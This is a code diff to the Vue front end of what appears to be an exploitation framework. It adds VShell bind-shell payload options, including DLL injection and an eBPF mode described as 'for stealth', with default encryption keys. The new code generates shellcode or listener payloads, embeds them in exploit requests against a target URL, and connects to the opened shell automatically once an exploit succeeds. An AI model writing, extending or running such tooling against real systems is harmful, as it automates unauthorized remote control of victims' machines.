@@ -289,14 +289,67 @@
           <el-switch v-model="useVShellShellcode" />
           <div class="field-hint">Generate and upload shellcode from VShell</div>
         </el-form-item>
-        <el-form-item v-if="useVShellShellcode" label="Client Type">
+        <el-form-item v-if="useVShellShellcode" label="Connection Mode">
+          <el-radio-group v-model="vshellConnectionMode">
+            <el-radio value="reverse">Reverse Shell (Target connects to you)</el-radio>
+            <el-radio value="listen">Listen Mode (You connect to target)</el-radio>
+          </el-radio-group>
+          <div class="field-hint">
+            {{ vshellConnectionMode === 'reverse'
+              ? 'Target will connect back to your listener'
+              : 'Target will open a port for you to connect to' }}
+          </div>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'reverse'" label="Client Type">
           <el-select v-model="shellcodeClientType" style="width: 100%;">
             <el-option label="Shellcode" value="shellcode" />
             <el-option label="Stage" value="stage" />
             <el-option label="Stageless" value="stageless" />
             <el-option label="DLL" value="dll" />
-            <el-option label="Listen" value="listen" />
           </el-select>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Listen Type">
+          <el-select v-model="listenModeType" style="width: 100%;">
+            <el-option label="Standard Listen" value="listen">
+              <span>Standard Listen</span>
+              <span style="color: #909399; font-size: 12px; margin-left: 8px;">TCP/HTTP/WS bind shell</span>
+            </el-option>
+            <el-option label="DLL Listen" value="dll_listen">
+              <span>DLL Listen</span>
+              <span style="color: #909399; font-size: 12px; margin-left: 8px;">DLL-based bind shell</span>
+            </el-option>
+            <el-option label="eBPF Listen" value="ebpf_listen">
+              <span>eBPF Listen</span>
+              <span style="color: #909399; font-size: 12px; margin-left: 8px;">Linux eBPF bind shell</span>
+            </el-option>
+          </el-select>
+          <div class="field-hint">
+            {{ listenModeType === 'listen' ? 'Standard bind shell payload' :
+               listenModeType === 'dll_listen' ? 'DLL format for Windows injection' :
+               'Linux eBPF mode for stealth' }}
+          </div>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Target Port">
+          <el-input-number v-model="listenModeTargetPort" :min="1" :max="65535" style="width: 100%;" />
+          <div class="field-hint">Port that will be opened on the target machine</div>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Protocol">
+          <el-select v-model="listenModeProtocol" style="width: 100%;">
+            <el-option label="TCP" value="tcp" />
+            <el-option label="HTTP" value="http" />
+            <el-option label="HTTPS" value="https" />
+            <el-option label="WebSocket" value="ws" />
+            <el-option label="KCP" value="kcp" />
+          </el-select>
+          <div class="field-hint">Transport protocol for the bind shell</div>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Connection Key">
+          <el-input v-model="listenModeVKey" placeholder="qwe123qwe" />
+          <div class="field-hint">Encryption key (default: qwe123qwe)</div>
+        </el-form-item>
+        <el-form-item v-if="useVShellShellcode && vshellConnectionMode === 'listen'" label="Encryption Salt">
+          <el-input v-model="listenModeSalt" placeholder="qwe123qwe" />
+          <div class="field-hint">Encryption salt (default: qwe123qwe)</div>
         </el-form-item>
         <el-form-item v-if="useVShellShellcode" label="Architecture">
           <el-select v-model="shellcodeArch" style="width: 100%;">
@@ -304,6 +357,7 @@
             <el-option label="Windows x86" value="windows_386.bin" />
             <el-option label="Linux x64" value="linux_amd64.bin" />
             <el-option label="Linux x86" value="linux_386.bin" />
+            <el-option label="Linux ARM" value="linux_arm.bin" />
             <el-option label="macOS x64" value="darwin_amd64.bin" />
             <el-option label="macOS ARM64" value="darwin_arm64.bin" />
           </el-select>
@@ -428,7 +482,7 @@ import { fetchLatestTargetRun, startScan as startScanAPI } from '@/api/scan'
 import { listExploits, triggerExploit, type ExploitInfo } from '@/api/exploit'
 import { useAssetStore } from '@/stores/asset'
 import type { ExploitOption } from '@/types'
-import { listListeners, addListener, generateShellcode, type VShellListener } from '@/api/vshell'
+import { listListeners, addListener, generateShellcode, downloadListenPayload, type VShellListener } from '@/api/vshell'
 
 const route = useRoute()
 const router = useRouter()
@@ -497,8 +551,14 @@ const exploitResult = ref<any>(null)
 const exploitResultMode = ref<ExploitMode>('execute')
 
 const useVShellShellcode = ref(false)
+const vshellConnectionMode = ref<'reverse' | 'listen'>('reverse')
 const shellcodeClientType = ref('shellcode')
 const shellcodeArch = ref('windows_amd64.bin')
+const listenModeType = ref('listen')
+const listenModeTargetPort = ref(8080)
+const listenModeProtocol = ref('tcp')
+const listenModeVKey = ref('qwe123qwe')
+const listenModeSalt = ref('qwe123qwe')
 
 const showCommandInput = computed(() => selectedMode.value === 'execute' && !!selectedExploit.value?.supports_command)
 const selectedExploitOptions = computed(() => {
@@ -1130,23 +1190,97 @@ async function submitExploit() {
     // Generate shellcode if VShell is enabled
     if (useVShellShellcode.value && vshellListenerId.value) {
       try {
-        const shellcodeBlob = await generateShellcode({
-          listener_id: vshellListenerId.value,
-          client_type: shellcodeClientType.value,
-          arch: shellcodeArch.value,
-        })
+        if (vshellConnectionMode.value === 'reverse') {
+          // Reverse shell mode: target connects back to listener
+          const shellcodeBlob = await generateShellcode({
+            listener_id: vshellListenerId.value,
+            client_type: shellcodeClientType.value,
+            arch: shellcodeArch.value,
+          })
 
-        // Convert blob to base64
-        const arrayBuffer = await shellcodeBlob.arrayBuffer()
-        const bytes = new Uint8Array(arrayBuffer)
-        const base64 = btoa(String.fromCharCode(...bytes))
+          // Convert blob to base64
+          const arrayBuffer = await shellcodeBlob.arrayBuffer()
+          const bytes = new Uint8Array(arrayBuffer)
+          let binary = ''
+          const chunkSize = 8192
+          for (let i = 0; i < bytes.length; i += chunkSize) {
+            binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize))
+          }
+          const base64 = btoa(binary)
 
-        // Add shellcode to options
-        options.shellcode = base64
-        options.shellcode_type = shellcodeClientType.value
-        options.shellcode_arch = shellcodeArch.value
+          // Add shellcode to options
+          options.shellcode = base64
+          options.shellcode_type = shellcodeClientType.value
+          options.shellcode_arch = shellcodeArch.value
 
-        ElMessage.success(`Generated ${shellcodeClientType.value} shellcode (${bytes.length} bytes)`)
+          ElMessage.success(`Generated ${shellcodeClientType.value} shellcode (${bytes.length} bytes)`)
+        } else {
+          // Listen mode: target opens a port for attacker to connect
+          let listenPayloadBlob: Blob
+          let payloadTypeLabel = ''
+
+          if (listenModeType.value === 'dll_listen') {
+            // DLL Listen mode: generate DLL with listen=true
+            listenPayloadBlob = await generateShellcode({
+              listener_id: vshellListenerId.value,
+              client_type: 'dll',
+              arch: 'loader',
+              listen: true,
+              tp: listenModeProtocol.value,
+              host: '0.0.0.0',
+              port: listenModeTargetPort.value,
+              vkey: listenModeVKey.value,
+              salt: listenModeSalt.value,
+            })
+            payloadTypeLabel = 'DLL listen'
+          } else if (listenModeType.value === 'ebpf_listen') {
+            // eBPF Listen mode: generate listen payload with ebpf=true
+            listenPayloadBlob = await downloadListenPayload({
+              arch: shellcodeArch.value.replace('.bin', ''),
+              port: listenModeTargetPort.value,
+              tp: listenModeProtocol.value,
+              host: '0.0.0.0',
+              vkey: listenModeVKey.value,
+              salt: listenModeSalt.value,
+              upx: true,
+              ebpf: true,
+            })
+            payloadTypeLabel = 'eBPF listen'
+          } else {
+            // Standard Listen mode
+            listenPayloadBlob = await downloadListenPayload({
+              arch: shellcodeArch.value.replace('.bin', ''),
+              port: listenModeTargetPort.value,
+              tp: listenModeProtocol.value,
+              host: '0.0.0.0',
+              vkey: listenModeVKey.value,
+              salt: listenModeSalt.value,
+              upx: true,
+            })
+            payloadTypeLabel = 'standard listen'
+          }
+
+          // Convert blob to base64
+          const arrayBuffer = await listenPayloadBlob.arrayBuffer()
+          const bytes = new Uint8Array(arrayBuffer)
+          let binary = ''
+          const chunkSize = 8192
+          for (let i = 0; i < bytes.length; i += chunkSize) {
+            binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize))
+          }
+          const base64 = btoa(binary)
+
+          // Add payload to options
+          options.shellcode = base64
+          options.shellcode_type = listenModeType.value
+          options.shellcode_arch = shellcodeArch.value
+          options.listen_port = listenModeTargetPort.value.toString()
+          options.listen_protocol = listenModeProtocol.value
+          if (listenModeVKey.value) options.listen_vkey = listenModeVKey.value
+          if (listenModeSalt.value) options.listen_salt = listenModeSalt.value
+
+          ElMessage.success(`Generated ${payloadTypeLabel} payload (${bytes.length} bytes) - target will open ${listenModeProtocol.value}:${listenModeTargetPort.value}`)
+        }
       } catch (e: any) {
         ElMessage.error(`Failed to generate shellcode: ${e.message}`)
         executing.value = false
@@ -1168,6 +1302,35 @@ async function submitExploit() {
     exploitResultMode.value = 'execute'
     showDialog.value = false
     ElMessage.success('Exploit executed')
+
+    // If listen mode and exploit succeeded, automatically connect to the bind shell
+    if (vshellConnectionMode.value === 'listen' && useVShellShellcode.value && result?.status === 'success') {
+      try {
+        // Extract IP from target URL
+        const targetUrl = new URL(exploitTarget.value.trim())
+        const targetIp = targetUrl.hostname
+
+        ElMessage.info(`Connecting to bind shell at ${targetIp}:${listenModeTargetPort.value}...`)
+
+        const { addClient } = await import('@/api/vshell')
+        const connectResult = await addClient({
+          ip: targetIp,
+          port: listenModeTargetPort.value,
+          tp: listenModeProtocol.value,
+          vkey: listenModeVKey.value || 'qwe123qwe',
+          salt: listenModeSalt.value || 'qwe123qwe',
+          ebpf: listenModeType.value === 'ebpf_listen',
+        })
+
+        if (connectResult.success) {
+          ElMessage.success(`Connected to bind shell at ${targetIp}:${listenModeTargetPort.value}`)
+        } else {
+          ElMessage.warning(`Failed to connect: ${connectResult.error || 'Unknown error'}`)
+        }
+      } catch (e: any) {
+        ElMessage.warning(`Failed to connect to bind shell: ${e.message}`)
+      }
+    }
   } catch (e: any) {
     ElMessage.error(`Exploit failed: ${e.message}`)
   } finally {
